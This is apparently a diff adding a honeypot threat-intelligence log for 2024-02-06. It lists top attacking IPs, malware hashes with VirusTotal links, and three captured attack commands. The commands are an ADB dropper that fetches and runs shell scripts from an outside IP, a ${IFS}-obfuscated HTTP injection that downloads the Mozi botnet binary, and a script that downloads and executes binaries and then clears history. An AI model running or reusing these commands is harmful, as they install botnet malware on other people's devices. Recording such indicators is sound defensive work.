@@ -1,0 +1,23 @@
+Top 5 IPs for 2024-02-06:
+
+185.24.35.198
+42.85.168.28
+46.100.69.21
+122.165.176.213
+125.228.36.191
+
+Malware download: 
+File name: eyshcjdmzg
+ea40ecec0b30982fbb1662e67f97f0e9d6f43d2d587f2f588525fae683abea73
+https://www.virustotal.com/gui/file/ea40ecec0b30982fbb1662e67f97f0e9d6f43d2d587f2f588525fae683abea73
+From :  tftp://77.159.87.49/.i
+020f1fa6072108c79ed6f553f4f8b08e157bf17f9c260a76353300230fed09f0
+https://www.virustotal.com/gui/file/020f1fa6072108c79ed6f553f4f8b08e157bf17f9c260a76353300230fed09f0
+
+Malciious Commands seen:
+
+cd /data/local/tmp/;rm -rf *sh* ; rm -rf *arm* ; rm -rf *ppc* ; rm -rf *x86* ; rm -rf *mips* ;rm -rf *mpsl* ; rm -rf *spc* ; rm -rf *m68k* ; busybox wget http://103.174.73.85/adb1.sh; sh adb1.sh; wget http://103.174.73.85/adb1.sh; sh adb1.sh; curl http://103.174.73.85/adb1.sh; sh adb1.sh; busybox wget http://103.174.73.85/adb2.sh; sh adb2.sh; wget http://103.174.73.85/adb2.sh; sh adb2.sh; curl http://103.174.73.85/adb2.sh; sh adb2.sh; busybox wget http://103.174.73.85/adb3.sh; sh adb3.sh; wget http://103.174.73.85/adb3.sh; sh adb3.sh; curl http://103.174.73.85/adb3.sh; sh adb3.sh
+
+GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}http://117.205.58.225:47181/Mozi.a;sh${IFS}/tmp/Mozi.a&>r&&tar${IFS}/string.js
+
+#!/bin/sh; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://43.249.172.195:888/112; curl -O http://43.249.172.195:888/112; chmod +x 112; ./112; wget http://43.249.172.195:888/112s; curl -O http://43.249.172.195:888/112s; chmod +x 112s; ./112s; rm -rf 112.sh; rm -rf 112; rm -rf 112s; history -c;
